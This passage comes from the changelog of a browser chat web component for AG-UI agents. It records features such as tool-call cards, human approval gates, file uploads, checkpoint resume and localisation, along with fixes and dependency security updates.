  `part` (`tool-card-args` / `tool-card-result`, headings via
  `tool-card-section-label`, body via `tool-card-body`), and are pretty-printed.

  Breaking for anyone styling `tool-card-result` as a single combined block.
  A call with no arguments no longer renders an empty `{}` in a box of its own.

- **`data-tool-display` is now live.** Changing it restyles every card already
  in the transcript, the way `data-answer-well` always has. The modes are pure
  visibility over **one DOM shape**, selected by the shadow CSS from the host
  attribute; previously each card baked its structure at construction from the
  value read at that moment, so a change reached only cards created afterwards
  and the setting appeared not to work until the next conversation.

  `ToolCallCard`'s constructor consequently no longer takes a mode argument.

- **The confirmation card leaves once it is answered.** It stayed in the
  transcript as a spent form with its buttons disabled, which read as an
  outstanding question rather than a settled one. A prompt and a record are
  different objects: the record is the tool card it gates, which settles to the
  outcome and scrolls with the rest of the transcript.

- **The confirmation card was appended to the wrong parent**, and it is the
  reason it drifted to the foot of a turn. Every other inline card — tool,
  approval, `ask_user`, run notices — goes into the turn's answer group; this
  one went into the message list, so it became a sibling *after* the group and
  anything that streamed afterwards rendered above it. It now joins the group
  like its siblings.

### Added

- **A gated call records the decision**, from the client-side confirmation card
  **and** the server-side approval interrupt. The tool card carries
  `approved by you` / `declined by you` (part `tool-card-decision`, attribute
  `data-decision`). Previously only a *refusal* left a trace — an approved call
  simply ran, making a gated call's transcript identical to one that was never
  gated, and the server-side gate left nothing at all even though it is the one
  guarding tools that run on the backend.

  **Session-scoped, like the "run interrupted" notice.** AG-UI carries no
  approval message — the answer rides `resume[]` as transient run input — so a
  reload restores the call and its result but not the note. Durable "who
  approved what" is an audit concern, not a transcript one.

- **Each header control takes its own icon slot** — `icon-history`,
  `icon-checkpoints`, `icon-new`, `icon-collapse` — with the built-in glyph as
  the fallback, so existing embeds are unchanged. The glyph used to be the
  button's own `textContent`: a host could restyle a control through its `part`,
  or swap one character for another with a CSS `content` override, but could
  never supply a brand `<img>` or `<svg>`.

- **`argumentsLabel`, `decisionApproved` and `decisionDeclined`** in `UiStrings`.
  `resultLabel` / `errorLabel` / `declinedLabel` are now the result region's
  heading rather than a toggle label, and `details` labels the toggle in every
  mode.

### Fixed

- **A server that reuses a message id now gets a warning.** `@ag-ui/client`
  appends to a message id already in its history rather than starting a new one,
  so two answers merge into one transcript entry — silently, and the merged
  entry is what gets persisted. The protocol has no rule to enforce and refusing
  the event would be worse than the merge, so this warns and continues.

  Found because the demo harness was doing exactly this, which is the
  argument for the harness in miniature: the bug was the consumer's, the
  invisibility was ours.

- **The demo playground covers the surface it is meant to demonstrate.** The
  scripted agent now dispatches on the latest turn — a server-resolved skill, a
  tool that throws, an `ask_user` question, or the form-filling script — instead
  of replaying one script for everything, and the page gained header-icon,
  German-strings and reset-size controls plus a short "what to try" guide.

  Two harness defects were making the component look broken. Its follow-up
  detection matched **any** tool message in the thread, so once a conversation
  had run a single tool every later turn answered "Done" to everything. And the
  page forced `flex: 1` on the element, which silently outranks the width a
  resize writes — the drag worked and nothing moved.

- **The demo harness reused message ids**, which produced three symptoms that
  all read as component bugs and were none of them. It streamed every follow-up
  answer under a hardcoded id, and `@ag-ui/client` appends to a message id
  already in its history rather than starting a new one — so repeating a prompt
  grew a single entry, that entry replayed out of order after a reload (sitting
  where it was first created, with the later prompts after it), and the
  unfinished-run notice then fired correctly over the corrupted history. Fresh
  ids per message, as a real server issues.

## [0.18.0] — 2026-08-10

### Added

- **A copy button on code blocks in agent answers.** An agent answering with
  code is answering with something the reader means to *use*, and selecting it
  by hand out of a scrolling transcript — inside a shadow root, in a narrow
  sidebar — was the one interaction the chat surface made harder than the page
  around it.

  Revealed on hover **and keyboard focus** (hidden-until-hover is invisible to a
  keyboard user), styleable via the `code-copy` part, with `copyCode` /
  `copied` / `copyFailed` in `UiStrings`.

  **It reports failure rather than always claiming success.** The Clipboard
  API needs a secure context and is simply absent in some embeddings; a button
  that always says "Copied" sends the reader off to paste stale clipboard
  content and find out somewhere else entirely.

### Fixed

- **A bare `data-prompt-chips` or `data-slash-commands` now enables the
  feature**, instead of silently disabling it. Both were compared against the
  string `"true"`, so writing the attribute bare — the spelling every native
  boolean attribute uses, and the one a reader reaches for first — turned off
  the thing it names, with nothing to indicate why the chips never appeared.
  `="false"` still turns them off.

- **The checkpoint panel manages focus.** It declared `role="dialog"` and took
  no focus at all, so a keyboard user was left behind an open dialog; the thread
  drawer had done this correctly all along. Focus now moves in on open, is
  restored on close, and Tab is trapped while it is open.

  **With no continuable runs the panel holds no controls**, so the panel
  itself is focusable as the fallback — otherwise "move focus to the first
  control" silently does nothing in exactly the case where the user has least to
  go on.

- **The README described a `dist/ag-ui-web-component.bundle.css` that the build
  has never emitted.** The styles are a template literal injected into the
  shadow root, so there is no sidecar to load — and a reader looking for the
  file to override was looking for the wrong seam. Documented as CSS custom
  properties and `part` attributes instead.

## [0.17.0] — 2026-08-10

### Added

- **`sendMessage(content, attachments?)`** — send as if the user had typed it:
  user bubble, `ag-ui-submit`, run started. The programmatic half of the
  composer, for an "Ask about this order" button, a command palette, or a
  composer of your own replacing the built-in one. The built-in Send now reads
  the composer, clears it, and calls this, so the two paths cannot drift.

  It no-ops while a run is in flight — a second concurrent run would orphan the
  first — and for an entirely empty message. Unlike the built-in Send it does
  **not** consult the attachment tray: what you pass is what is sent, so a host
  composer stays in charge of its own state.

- **`attachFile(file)`** — queue a file into the tray exactly as the picker and
  drag-and-drop do, with the same validation and progress chip. Returns `false`
  when uploads are not configured (no `data-attachments-url`, no
  `uploadHandler`), which is the only way for a host to tell: with no tray there
  is nothing to report through, and silence would read as a queued file that
  never uploads.

- **`ag-ui-attachments` event**, dispatched whenever the tray changes — a file
  queued, an upload finishing or failing, a chip removed, the tray cleared after
  a send. `detail` carries `{ attachments, pending }`: the durable refs of
  everything settled, and how many are still in flight.

  **This is what makes `sendMessage` usable with files at all.** The tray only
  ever spoke to the built-in Send button, so a host composer had no way to tell a
  settled upload from one still uploading — the same information the built-in
  Send needs, which was simply not exposed. The tray's `onChange` hook already
  existed and nothing was wired to it.

### Changed

- **Assigning a connect-time-only attribute after the element has connected now
  warns**, instead of being silently ignored: `data-attachments-url`,
  `data-attachment-accept`, `data-attachment-max-bytes`, `data-transcribe-url`,
  `data-threads-url`, `data-tools-url`, `data-skills-url`, `data-skills`,
  `data-prompt-chips`, `data-slash-commands`, `data-theme-toggle`,
  `data-strings`, `data-icon-url`.

  Each is read once while connecting, to decide what chrome exists at all, and
  no later read revisits the decision. **The symptom is an affordance that
  simply never appears** — which reads as a broken component rather than a
  mis-timed assignment, and it is the common React/Vue shape: the element mounts
  on the first render pass and the framework patches attributes in on the next.

  Set them before the element enters the DOM, or remove and re-insert it to
  apply a new value. The attributes that genuinely *are* re-read per use —
  `data-runs-url`, `data-page-actions`, `data-text-animation`,
  `data-tool-display`, `endpoint`, and CSS-reactive `theme` / `collapsed` — are
  deliberately excluded, since a late change works there and a warning would be
  wrong.

### Fixed

- **The checkpoint panel now follows the theme.** Its rules read `--agui-surface`
  / `--agui-border` / `--agui-hover` — note `--agui-`, not the `--ag-ui-`
  namespace every other rule uses — each with a hardcoded light-mode fallback.
  So the panel ignored `theme="dark"` entirely and rendered light-on-dark unless
  a host happened to set three variables documented nowhere. Now derived from the
  real theme tokens, with a new theme-aware `--ag-ui-hover` defined in every
  theme block. The fallbacks are what hid it: they made an unthemed panel look
  deliberate.

  `checkpoints-title` and `checkpoint-label` also gain `part` attributes — they
  carried classes only, so neither could be styled from outside the shadow root.

- **Markdown tables are styled.** `table` / `thead` / `tbody` / `tr` / `th` /
  `td` are all in the sanitizer's `ALLOWED_TAGS`, so an agent emitting a table
  rendered it — completely unstyled, overflowing its bubble. Wide tables now
  scroll inside their own box rather than pushing the layout sideways.

- **Sending while a file is still uploading now says so.** `readyRefs()` returns
  only settled uploads and `clearReady()` deliberately keeps the rest for a
  follow-up message — so the file was never lost, but the message went without
  it and nothing indicated that. Attachments are frequently the entire point of
  the message, which is what made the silence the defect. An inline notice now
  names how many are still uploading and that they remain attached.

  Send is deliberately **not** disabled while uploads are pending: that would
  fight the tray's documented "keep for a follow-up" behaviour and could wedge
  on an upload that never settles.

## [0.16.0] — 2026-08-09

### Added

- **A stale-page guard on frontend tool calls.** A round's context records the
  page it describes; if the page moves before the agent's tool call arrives, the
  call is refused with a result telling the agent to call `read_page` and retry,
  instead of running the handler. Most stale calls would simply miss and report
  a failure — the case this prevents is the other one, where a same-named
  control on the *new* page matches and the agent silently acts on the wrong
  page. `read_page` itself and tools marked `x-navigates` are exempt, and the
  guard is inert unless a `getPageMap` provider is set.
- **New `UiStrings` keys `runInterrupted` and `pageMoved`**, both overridable
  like every other string.

### Changed

- **Toolchain majors: Vitest 3 → 4 and TypeScript 5.9 → 7**, plus `marked`
  18.0.9, Biome 2.5.7, `@types/node` 26.1.2. All development dependencies — the
  emitted `.d.ts` files are **byte-identical** to the 5.9 output (verified by
  building both and diffing; only the source maps move), so consumers see no
  change.

  **Vitest 4 takes a provider *instance*, not the string `"playwright"`.**
  The provider moved to its own package (`@vitest/browser-playwright`) and, with
  v8 coverage, the old string form is a hard error rather than a deprecation.

  **TypeScript 7 requires `rootDir` explicitly** (TS5011) instead of
  inferring it from the common source directory. Set to the value 5.x inferred,
  so the published layout is unchanged.

### Fixed

- **A run interrupted by navigation no longer vanishes silently.** If the page
  navigates or reloads while a run is in flight — routine in an MPA — the
  element is destroyed with it, and on the next mount the transcript replayed
  with the answer simply missing and no indication anything had gone wrong. The
  element now reports it as an inline notice. Detected from the shape of the
  transcript (`send()` persists the user turn *before* starting the run, so a
  history ending on that turn means nothing came back), which is why it needs no
  `ClientConversationStore` change and no `pagehide` listener — neither of which
  would fire on a crash or a force-quit anyway.

  It is deliberately **a notice, not a resume**: AG-UI has no
  resume-an-aborted-run primitive, so re-sending the accumulated messages is
  semantically a new run and would re-execute any server-side tool the agent had
  already performed. The agent-initiated case is unaffected — a navigating tool
  still checkpoints and resumes exactly as before.

- **Six branches that were never actually covered.** Vitest 4's v8 provider
  remaps coverage more precisely, and the 100% gate stopped being satisfiable —
  not because anything regressed, but because v3 had been crediting six
  branches and three callbacks that no test reached. Each is now genuinely
  tested: the paperclip button opening the file picker, the built-in
  transcription handler (every prior voice test supplied its own), a page-action
  tool resolving through `resolvePageTarget`, a non-`Enter` keystroke in a
  question card, a submit click with no answer, a non-string `error` in a
  transcription error body, and a restored history message with an unrecognised
  role.

  **One was a flaw in the test harness, not a missing test.** `makeFakeAgent`
  ended a clean run by calling `onRunFinalized` alone, so the client's
  `RUN_FINISHED` path could only ever be reached through `emit.interrupt()` —
  the ordinary success outcome every real run carries was never exercised. The
  fake now emits both events, in the order a real agent does.

  `route_map`'s unreachable guard was restructured away rather than tested: its
  regex capture group is mandatory, so the `undefined` case existed only to
  satisfy `noUncheckedIndexedAccess` and no test could ever have reached it.

## [0.15.0] — 2026-08-08

### Changed

- **Sanitisation is now tested in a real browser.** `vitest.config.ts` defines
  two projects: **happy-dom** for the bulk of the suite, and **Chromium**
  (Playwright) for the tests whose subject is sanitisation. Coverage stays
  unified at 100% across both.

  **A correctness requirement, not an optimisation.** DOMPurify 3.4.8+
  silently stops sanitising under happy-dom — `<script>` and `<img>` pass
  straight through, and ordinary markdown loses its `<p>` wrapper. A
  happy-dom-only suite can therefore go green while this component ships no
  sanitisation at all, which is the one failure it must never ship.

  **The experiment settles what the pin never could**: dompurify 3.4.13
  sanitises correctly in Chromium. The defect is happy-dom's DOM emulation, not
  a DOMPurify regression — so **consumers were never exposed**, and the risk was
  confined to the test environment the whole time.

  The browser run also *removes* a workaround instead of carrying it: happy-dom
  eagerly **executed** inline `<script>` while DOMPurify parsed into its scratch
  document, so the suite had to stub `alert`. A real browser parses into an
  inert context.

### Security

- **`dompurify` is a normal caret range again** (`^3.4.13`), lifting the
  exact-version pin — and with it the **five advisories** that pin was holding
  open (three LOW, two MEDIUM). The browser project is what made that safe, and
  is the standing acceptance check.

## [0.14.1] — 2026-08-07

### Security

- **Five advisories closed**: `vite` → 7.3.6 (HIGH + MEDIUM), `postcss` → 8.5.26
  (HIGH), `brace-expansion` → 2.1.4 (HIGH), `esbuild` → 0.28.1 (LOW). All four
  are transitive, so they are pinned through `overrides` — there is no direct
  dependency to bump.

  **`overrides` now live in `pnpm-workspace.yaml`**, not the `pnpm` field in
  `package.json`; pnpm 11 ignores the latter and only warns. And an override
  must be scoped to its major — an unbounded `brace-expansion: ">=2.1.2"`
  resolves to 5.x, whose export shape `minimatch` cannot call, breaking `glob`
  at runtime.

- **Four `dompurify` advisories are knowingly left open** (three LOW, one
  MEDIUM), and the dependency is now pinned to **exactly `3.4.7`** rather than
  `^3.4.7`.

  3.4.8 through 3.4.13 **mis-sanitise under happy-dom**: `<script>` and `<img>`
  pass straight through, which `tests/render_markdown.test.ts` catches. Verified
  again against dompurify 3.4.13 with happy-dom 20.11.1 — moving the test DOM
  forward does not fix it.

  **The pin was previously a caret range**, so the hold existed only in the
  lockfile and nowhere in the manifest, undocumented — a `pnpm update` would
  have silently disabled sanitisation. It is now exact, explained at the import
  site in `src/ui/render_markdown.ts`, and recorded in `CLAUDE.md`.

  The trade is deliberate: those advisories describe narrow bypasses, while
  taking them costs *all* sanitisation under the only DOM the suite can run in.
  `tests/render_markdown.test.ts` is the acceptance check for lifting it.

## [0.14.0] — 2026-07-28

### Added

- **Run notices — a muted inline annotation for things the *run* did**, as
  opposed to work the user asked for. Styleable via the `run-notice`,
  `run-notice-icon` and `run-notice-text` parts; announced with `role="status"`
  so a screen reader hears it politely rather than mid-sentence.
  - **Compaction.** A standard AG-UI `ACTIVITY_SNAPSHOT` with
    `activityType: "compaction"` (emitted by django-ag-ui 0.26+ when a
    compaction capability trimmed the history) renders as "earlier turns
    condensed", with the count. Activity events of any other type pass through
    untouched, so another producer on that channel isn't mistaken for one.
  - **Agent skills.** There is no dedicated event: loading a deferred capability
    *is* an ordinary `load_capability` tool call, which is what reaches the
    client. It now renders as `Using skill <id>` **instead of** the raw tool
    card it would otherwise produce.

    Not to be confused with the existing `Skill` catalog — that is a *human*
    affordance (a prompt the user launches from the chip row or `/`-palette).
    An agent skill is chosen by the model mid-run. Only the latter emits a
    notice.
  - **Suppression covers all three paths a card can come from** — the live
    stream, the client's tool-execution loop, and **restored history** — so a
    reload shows the same transcript rather than resurrecting the raw
    `load_capability` card.
  - A `load_capability` call with **no usable id** falls back to a normal tool
    card rather than being dropped: a malformed call is still real activity, and
    hiding it would be worse than showing it plainly.
- **`onActivity(activityType, content)`** on `AgUiClientHandlers`, forwarding
  AG-UI activity events to the host element. `COMPACTION_ACTIVITY_TYPE` and
  `LOAD_CAPABILITY_TOOL` are exported from `constants`.
- **Two new overridable strings**: `historyCompacted` (token `{count}`) and
  `usingSkill` (token `{name}`).

## [0.13.0] — 2026-07-27

### Added

- **AG-UI shared state.** `<ag-ui-chat>` now speaks the protocol's own state
  channel: assign `chat.sharedState = {...}` to seed it, listen for the
  `ag-ui-state` event (`detail.state`) to react when the agent changes it.
  State rides `RunAgentInput.state` on every run and is replaced in place when
  the server streams `STATE_SNAPSHOT` / `STATE_DELTA`.
  - **Adoption, not implementation.** `@ag-ui/client` already applies both
    events to `agent.state` and exposes an `onStateChanged` subscriber hook;
    what was missing was seeding it (`initialState`) and surfacing it to the
    host. Deriving state from the raw event stream ourselves would have
    duplicated — and eventually contradicted — the client's own handling,
    including its JSON-Patch delta application.
  - Assigning **after** the conversation has started pushes through to the live
    agent rather than waiting for a new one, so a host that seeds state late
    isn't silently stranded.
  - The event is `composed: true`, so a host listening on `document` receives it
    through the shadow boundary.
  - **Distinct from `registerPageState`**, which exposes host state to the agent
    as ordinary *tools*. Use shared state when agent and page edit the same
    object; use page-state tools when the agent should *ask* — a tool call is
    visible in the transcript and can be gated by a confirmation card, which
    state events cannot.

### Changed

- **`registerStateHook` is now `registerPageState`** (and `createStateHookTools` /
  `StateHook` are `createPageStateTools` / `PageState`). **The old names implied a
  feature that does not exist**: they read as AG-UI shared-state sync —
  `STATE_SNAPSHOT` / `STATE_DELTA`, the protocol events that carry a state object
  between agent and client — which neither this component nor `django-ag-ui`
  implements. What the method actually does is generate two ordinary client tools
  (`read_<name>` / `set_<name>`) over host page state, which the agent calls like
  any other tool. `page` matches the vocabulary already used throughout the
  component (`page_map`, `page_action_tools`, `route_map`, the DOM driver).
  - **Not a hard break.** The old spellings are kept as deprecated aliases and
    behave identically; they will be removed in a future major. A rename is only
    ever cheaper the earlier it happens, which is why this ships now rather than
    waiting for state support to exist.

### Documentation

- **The README now distinguishes the two state mechanisms**, which the old
  method name conflated. `sharedState` is the protocol's state channel;
  `registerPageState` generates ordinary client tools. The rename and the
  feature landed together, so the docs answer "which one" rather than leaving
  two similar names side by side.

## [0.12.0] — 2026-07-27

### Added

- **Resume or fork a run — the checkpoint UI.** With `data-runs-url` pointed at
  django-ag-ui's run index (`RunsView`, 0.23+), a ⭯ button appears in the header
  opening a *Continue a run* panel. Type the next turn, pick a row, and the run
  continues from its last server-side checkpoint — **Resume** to carry on,
  **Fork** to branch without touching the original. The client half of durable
  step persistence, whose server half shipped in django-ag-ui 0.20.0.
  - **Only continuable runs are offered.** The server reports whether a run has
    a snapshot to seed from; one that never reached a provider-valid boundary
    has none, so resuming it would start from nothing. Rows show when the run
    started (id on hover, for correlating with server logs) and mark a branched
    run so a fork doesn't read as a duplicate of its parent.
  - **One URL configures three endpoints.** `resume/<id>/` and `fork/<id>/` are
    siblings of the index — the server mounts all three together — so they are
    derived rather than configured, and a half-configured set isn't expressible.
  - **The client contract is structural, not a rule to remember.** Those
    endpoints require a *fresh run id* and *only the new turn*, because the
    server supplies prior turns from the snapshot and re-sending them would
    duplicate the conversation. A continuation therefore runs on its own
    short-lived agent, pointed at the resume endpoint and seeded with **no**
    history — so the new turn is the only thing it *can* send, the fresh run id
    comes free, and the main agent's history is never touched.
  - A resumed run is otherwise a normal run: frontend tools execute, approval
    interrupts render, and `headers` are re-read per request so a rotated
    token still reaches the endpoint. An unreachable index shows the panel's
    empty state rather than an error.
  - New exports: `RunIndex` / `RunRow`, `CheckpointMenu` / `CheckpointVerb`, and
    five UI strings (`checkpoints`, `noCheckpoints`, `resumeRun`, `forkRun`,
    `forkedRun`) for localization.

## [0.11.0] — 2026-07-14

### Added

- **Server-side tool approval — the browser half of the human-in-the-loop gate.**
  When a gated server-side tool defers instead of executing, the run finishes on
  an AG-UI *interrupt*; the client now renders an inline **approval card**
  (`requestApproval`, next to the pending tool-call card) and, on the user's
  decision, resumes the run with the answer via the protocol's `resume[]`.
  Approve runs the tool (its result streams back into the same card); deny sends
  a `cancelled` answer so the model learns it was declined and the card settles
  as declined. No `@ag-ui/*` dependency bump — the interrupt/resume types already
  ship in the pinned `0.0.x`. `AgUiClient` gains a `resolveInterrupts` config hook
  and exports `InterruptResponse` / `ResolveInterrupts`. The card is fully
  customizable: `strings` (`approveAction` / `approvalPrompt` / `approve` /
  `deny`), a `::part()` surface (`approval`, `-body`, `-actions`, `-button`,
  `-approve`, `-deny`), and an `approvalRenderer` hook that fully replaces the UI
  (given the request + a Stop `AbortSignal`, resolves approve/deny). Exports
  `ApprovalRenderer`.
- **`ask_user` — a built-in typed-question frontend tool (opt-in).** Set
  `askUser = true` on `<ag-ui-chat>` to offer the agent an `ask_user(question,
  options?, allow_custom?)` tool: calling it renders an inline **question card**
  (`requestQuestion` — radio choices and/or a free-text field) and returns the
  chosen or typed answer as the tool result, reusing the existing frontend-tool
  path (no new protocol). Off by default, like the other built-in tool groups, so
  the advertised catalog is unchanged until a host opts in. The card is **fully
  customizable**: localized `strings` (`askUserAction` / `otherOption` /
  `answerPlaceholder` / `submit`), a full `::part()` surface (`question`,
  `question-body`, `-options`, `-choice`, `-radio`, `-input`, `-actions`,
  `-button`), and a `askUserRenderer` hook that fully replaces the UI with a
  host-supplied renderer (given the request + a Stop `AbortSignal`, resolves the
  answer). Exports `QuestionRenderer`.
- **Complete `::part()` coverage sweep.** Every rendered UI element now exposes a
  `part` for `::part()` styling — closing gaps in the attachment chips
  (`attachment-chips` and the shared `attachment-chip*` parts, now on both the
  composer tray and the read-only chips on sent bubbles), the skills UI
  (`skill-chips` / `skill-chip` / `skill-palette` / `skill-item*` / `skill-hint`),
  the history-drawer row internals (`drawer-row-title` / `-time` / `-preview` /
  `-actions` / `-rename` / `-delete`, the inline `drawer-rename-input`, and the
  `drawer-confirm*` delete prompt), plus `thoughts-label`, `question-choice-text`,
  and the `stopped` note. All are documented in the README "Available parts" list.

## [0.10.0] — 2026-07-02

### Added

- **Upload cancellation.** `UploadHandler` gains an optional third argument,
  `signal: AbortSignal`. Removing a pending chip, clearing the tray, or removing
  the element now aborts the in-flight upload, so a cancelled transfer no longer
  orphans a server-side file. Non-breaking: existing two-argument handlers keep
  working; a custom handler that honours the signal should abort its own
  transport when it fires.
- **Teardown on disconnect.** `<ag-ui-chat>` now cleans up when it leaves the
  DOM (a removed node or a client-side route swap): it cancels the in-flight
  run so the SSE stream closes, aborts in-flight uploads, and releases the
  microphone so the browser's recording indicator clears.
- **Accessible history drawer.** The chat-history drawer is now a proper modal
  dialog — Escape closes it, focus moves into the panel on open and is restored
  to the opener on close, Tab is trapped within the panel, and an inline rename
  commits on blur.
- **Per-instance storage scoping.** The collapsed / theme / active-thread state
  and the default thread store are now namespaced by the element's `id` (else
  its `endpoint`), so two `<ag-ui-chat>` instances — or two apps — on the same
  origin no longer share state. Pre-existing per-tab state migrates into the
  namespace automatically on first load.

### Fixed

- **Submit while running.** Pressing Enter during a live run no longer starts a
  second, concurrent SSE run (which orphaned the first and could corrupt its
  pending tool cards). Enter now matches the Send/Stop button and is ignored
  while a run is in flight.
- **Thread-switch race.** Rapidly switching threads against a slow remote store
  can no longer interleave two replays into one transcript — a stale replay is
  dropped once a newer switch begins.
- **Malformed thread responses.** A `200` from the threads endpoint whose body
  isn't valid JSON (a proxy's HTML error page, a truncated stream) now falls
  back to the local cache instead of silently failing to load the drawer or
  history.
- **Relative timestamps.** An unparseable or missing `updated_at` now renders a
  neutral "just now" rather than `"NaNw ago"` or `"~2950w ago"`.
- **Corrupt attachment refs.** Malformed entries in a message's persisted
  attachments are dropped instead of throwing and aborting the whole history
  replay.
- **Retry of a rejected upload.** Retrying a chip that was rejected client-side
  (oversize / disallowed type) now re-applies the guard instead of uploading the
  file in full.
- **Duplicate tool result.** A repeated `TOOL_CALL_RESULT` (or a replayed tool
  message for an already-settled card) no longer appends a second result
  section.
- **Run-error continuation.** A run that ends in an error is now terminal: the
  loop no longer proceeds into frontend-tool execution or another round, so a
  failed run can't surface a confusing second error. Pending tool cards still
  settle.

## [0.9.0] — 2026-06-30

### Added

- **Model thoughts.** When the server forwards a reasoning model's
  chain-of-thought, the element now renders a muted, collapsible **thoughts
  region** (part `thoughts`) at the top of the current answer group — it streams
  while the model reasons and folds away on the answer's first token (the reader
  can reopen it). `AgUiClientHandlers` gains `onReasoningStart` / `onReasoningDelta`
  / `onReasoningEnd`, wired from `@ag-ui/client`'s `REASONING_*` subscriber
  callbacks (which also cover the deprecated `THINKING_*` family).
- **Voice input.** Set `data-transcribe-url` (django-ag-ui's
  `TranscribeView`) to reveal a mic button in the composer (part
  `voice-button`): it records via `MediaRecorder`, POSTs the clip, and drops the
  returned transcript into the textarea. A pluggable `transcribeHandler` —
  `(audio: Blob) => Promise<string>` — swaps the transport (a different STT
  endpoint, a Web Speech adapter) and reveals the mic even without the attribute.
  New exports: `transcribeAudio`, `TranscribeOptions`, `TranscribeHandler`.
- **Built-in theme toggle.** The boolean `data-theme-toggle` attribute
  adds an optional light⇄dark toggle to the header (part `theme-toggle`,
  `toggleTheme()`) that flips `theme` and persists per tab. Off by default, so a
  host-supplied switch in `slot="header-actions"` stays unaffected.

## [0.8.1] — 2026-06-30

### Fixed

- **Page-mode column alignment.** In `placement="page"`, the rows between the
  message list and the composer — skill chips, the `/`-command palette, the
  missing-placeholder hint, and the upload tray — stayed left-anchored while
  `.messages` and `.input-row` centred on `--ag-ui-content-max-width`. They now
  share the same column gutter, so the whole page reads as one centred column.

## [0.8.0] — 2026-06-30

### Added

- **Per-turn answer group + opt-in well.** Each assistant turn now
  renders inside one `.answer` group (part `answer`) that holds its streamed
  text, tool cards, and pending indicator — so a turn that calls tools reads as
  a single answer instead of loose siblings. The group spans the whole
  multi-round frontend-tool loop (several AG-UI runs), opening on the turn's
  first run and closing at settle; user bubbles stay outside it, and history
  replay reconstructs one group per assistant turn. Add the boolean
  `data-answer-well` attribute to box that group in a bordered, padded "well"
  (themeable via `--ag-ui-well-bg` / `--ag-ui-well-border`); without it the
  layout is the flat stack as before. Pure CSS, turn-scoped, no JS API.
- **Full-screen page placement.** New `placement="page"`: a full-bleed
  background with the conversation in a centred reading column (default ~820px,
  set via `--ag-ui-content-max-width`). The assistant turn spans the column
  while the user message stays a right-aligned pill — the layout for a dedicated
  chat page (distinct from `full`'s edge-to-edge, left-aligned messages).
- **Inline tool-display mode + themeable status icons.** New
  `data-tool-display="inline"`: the lightest card — a one-line status row (icon
  + summary, no box chrome) with the result behind its own toggle. Every
  tool-call card now leads with a CSS-drawn **status icon** (part
  `tool-card-icon`): a spinning ring while running, then a check / cross / slash
  on success / error / decline, replacing the hardcoded `` glyph. Re-theme via
  `--ag-ui-tool-icon-done` / `--ag-ui-tool-icon-error` / `--ag-ui-tool-icon-declined`
  and `--ag-ui-tool-spin-duration`; the spin respects `prefers-reduced-motion`.

## [0.7.0] — 2026-06-26

### Added

- **Localization (i18n).** Every user-facing string — labels, placeholders,
  `aria-label`s, and `title` tooltips — now reads from a flat `UiStrings` table.
  Override any subset via the `strings` property or the `data-strings` JSON
  attribute (the property wins key-by-key); the rest fall back to the English
  defaults. A few keys are `{token}` templates (`minutesAgo`, `confirmRun`,
  `tooLarge`, …). New exports: `UiStrings`, `DEFAULT_UI_STRINGS`,
  `mergeUiStrings`.
- **`::part()` styling and replaceable slots.** Every structural element exposes
  a stable `part` (`panel`, `header`, `title`, `messages`, `tool-card`,
  `composer`, `input`, `send`, `launcher`, the drawer parts, …) so hosts restyle
  from outside the Shadow DOM without piercing it. Coarse slots — `icon`,
  `header-actions`, `empty`, `footer`, `launcher` — replace whole regions with
  host markup.
- **Header / launcher icon.** An `icon` slot (any markup) before the title, or
  the `data-icon-url` attribute convenience (an `<img>`); the slot wins. Sized
  via `--ag-ui-icon-size`.
- **Sidebar placement.** `placement="sidebar"` is a full-height docked panel
  that slides open/closed and collapses to a slim icon **rail** (instead of the
  floating launcher). Docks right by default; `data-side="left"` docks left.
  Overlays by default (`--ag-ui-position: static` for host-managed push); the
  slide honours `prefers-reduced-motion`; the rail carries `aria-expanded`.
- **Built-in page-action tools.** Opt in via `data-page-actions` (a comma list of
  `scroll` / `drag`): `scroll_to` (a target into view — `top` / `bottom` / a
  selector or page-map id) and `drag_and_drop` (fires the native HTML5 drag
  sequence so the page's own drop handler reacts). Targets resolve through the
  overridable `resolvePageTarget` property. Not stamped destructive — gate
  auto-persist-on-drop pages with `confirmPredicate`. New exports:
  `createPageActionTools`, `PAGE_ACTIONS`, `ResolvePageTarget`.

### Fixed

- **Stuck "pending" UI when the stream drops mid-run.** A run whose stream closes
  without a terminal `RUN_FINISHED` / `RUN_ERROR` event used to resolve as if it
  had succeeded, leaving the thinking indicator — and any in-flight tool card —
  stuck forever. Such a close is now surfaced as a connection-loss error (the
  localizable `connectionLost` string), and `onSettled` sweeps any tool card
  still pending to the no-result fallback. New export: `ConnectionLostError`.

## [0.6.0] — 2026-06-25

### Added

- **File uploads.** Set `data-attachments-url` (django-ag-ui's `AttachmentsView`)
  to reveal a picker + drag-and-drop on the composer. Each file uploads
  out-of-band (multipart, with the element's `headers`) into a pending tray —
  one chip per file with a progress bar, settling to `ready` or `error` (with
  retry / remove). On send, the ready files' refs render as read-only chips on
  the user bubble and travel to the agent: the wire stays vanilla AG-UI (only
  lightweight `{ id, name, mime, size }` refs, never bytes), the model learns the
  ids from a one-line run-context manifest, and reads contents server-side via
  the `read_attachment` tool. Refs persist on the message, so a restored
  conversation re-renders its chips.
- **Client-side guards** (instant feedback; the server stays authoritative):
  `data-attachment-accept` (an `<input accept>` list) and
  `data-attachment-max-bytes` (default 10 MiB, `0` disables).
- **Pluggable upload transport.** A new `uploadHandler` property —
  `(file, onProgress) => Promise<AttachmentRef>` — swaps the built-in multipart
  upload for a custom one (a resumable `tus-js-client` adapter, direct-to-S3
  multipart, …) without touching the tray, chips, or AG-UI wire. When set, the
  affordance appears even with no `data-attachments-url`. Defaults to the
  built-in `uploadAttachment`.
- **New exports:** `uploadAttachment` + `UploadOptions` + `UploadHandler`, the
  `AttachmentRef` type, and `messageAttachments`. `AgUiClient.send` gains an
  optional second `attachments` argument; the `ag-ui-submit` event `detail` now
  also carries `attachments`.

## [0.5.0] — 2026-06-24

### Added

- **Chat-history drawer.** A history toggle (☰) in the header opens a slide-over
  listing the user's past conversations (title · relative time · preview), with
  select, new chat, inline rename, and delete-with-confirm. The
  `ClientConversationStore` interface gains `listThreads` / `setActiveThread` /
  `renameThread` and a `ThreadMeta` row shape; the default `SessionStorageStore`
  now keeps a per-tab thread index so the drawer works with no server. Selecting
  a row switches the active conversation and replays its history. The drawer is a
  slide-over by default, with an inline side-panel variant for
  `placement="embedded"`.
- **Server-backed history via `data-threads-url`.** Set the attribute (to
  django-ag-ui's `ThreadsView` URL) and the drawer routes list / load / rename /
  delete through that endpoint via a new `RemoteConversationStore`, showing
  durable, cross-device threads. The client store remains the offline fallback;
  rename / delete apply optimistically.

## [0.4.0] — 2026-06-12

### Added

- **Cancel / stop a run.** `AgUiClient.cancel()` aborts the in-flight
  streaming request (`abortRun()` — AG-UI's transport-level cancel; the
